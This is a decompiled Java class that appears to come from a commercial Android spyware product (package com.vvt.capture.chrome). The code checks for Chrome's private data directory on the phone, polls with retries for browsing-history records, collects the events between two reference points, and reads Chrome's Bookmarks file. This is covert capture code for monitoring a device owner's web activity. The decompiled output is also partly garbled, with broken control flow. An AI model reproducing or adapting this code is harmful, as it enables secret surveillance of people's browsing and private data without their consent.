package com.vvt.capture.chrome.a;

import android.os.SystemClock;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.g;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class f
  implements com.vvt.base.capture.f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private long d = -1;
  private String e;
  private String f;
  
  public f(String paramString1, String paramString2)
  {
    this.e = paramString1;
    this.f = paramString2;
  }
  
  private boolean c()
  {
    File localFile = new java/io/File;
    String str = "/data/data/com.android.chrome/app_chrome/Default";
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (bool) {
      bool = true;
    }
    for (;;)
    {
      return bool;
      bool = false;
      localFile = null;
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      bool1 = c();
      if (bool1)
      {
        String str1 = this.e;
        String str2 = this.f;
        long l2 = a.a(str1, str2);
        bool1 = false;
        str1 = null;
        l3 = l2;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l3 < l1;
          if (bool3) {
            break;
          }
          int k = 10;
          if (j >= k) {
            break;
          }
          l3 = 6000L;
          SystemClock.sleep(l3);
          str1 = this.e;
          str2 = this.f;
          long l4 = a.a(str1, str2);
          int i = j + 1;
          j = i;
          l3 = l4;
        }
      }
      boolean bool4;
      bool2 = b;
    }
    catch (Exception localException)
    {
      bool2 = c;
      if (bool2) {}
      l3 = l1;
      bool4 = l3 < l1;
      if (bool4) {
        break label194;
      }
    }
    if (bool2) {}
    long l3 = this.d;
    for (;;)
    {
      Long localLong = Long.valueOf(l3);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label194:
      this.d = l3;
    }
  }
  
  public List a(int paramInt)
  {
    long l1 = -1;
    int i = a;
    if (i != 0) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      i = c();
      if (i != 0)
      {
        Object localObject = this.e;
        String str1 = this.f;
        long l2 = a.a(paramInt, (String)localObject, str1);
        localObject = this.e;
        String str2 = this.f;
        long l3 = a.a((String)localObject, str2);
        i = 0;
        localObject = null;
        for (;;)
        {
          boolean bool2 = l2 < l1;
          if (bool2)
          {
            bool2 = l3 < l1;
            if (bool2) {
              break;
            }
          }
          int k = 10;
          if (i >= k) {
            break;
          }
          l2 = 6000L;
          SystemClock.sleep(l2);
          str1 = this.e;
          String str3 = this.f;
          l2 = a.a(paramInt, str1, str3);
          str2 = this.e;
          String str4 = this.f;
          l3 = a.a(str2, str4);
          int j;
          i += 1;
        }
        bool1 = l2 < l1;
        if (bool1)
        {
          bool1 = l3 < l1;
          if (bool1)
          {
            l1 = 1L;
            l2 -= l1;
            localObject = this.e;
            String str5 = this.f;
            localObject = a.a((String)localObject, l2, l3, str5);
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.e;
      String str = this.f;
      localObject = a.a((String)localObject, l1, l2, str);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public ArrayList b()
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "/data/data/com.android.chrome/app_chrome/Default";
    arrayOfObject[1] = "Bookmarks";
    return a.a(String.format("%s/%s", arrayOfObject));
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */